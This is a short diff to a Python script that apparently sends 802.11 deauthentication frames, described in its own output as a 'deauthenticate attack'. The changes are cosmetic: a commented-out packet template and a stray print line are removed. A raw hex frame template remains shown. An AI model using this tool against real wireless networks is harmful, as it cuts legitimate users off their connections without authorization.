@@ -19,7 +19,6 @@ from sys import argv
 # A template for generic 802.11 deauthenticate packets. Can't be 
 # bothered with the details of each feild.
 
-#deauth = '00000c000480000002001800c0003a01{0}{1}{0}706a0100'
 deauth = '00000d00048002000200010000c0003a01{0}{1}{0}706a0100'
 
 
@@ -79,12 +78,11 @@ def main():
         print('Starting deauthenticate attack. ^C to quit.')
         exploit(*argv[1:])
 
-        print('Byte')
-
     else:
         print(__doc__)
 
 
 
 main()
+print()
 
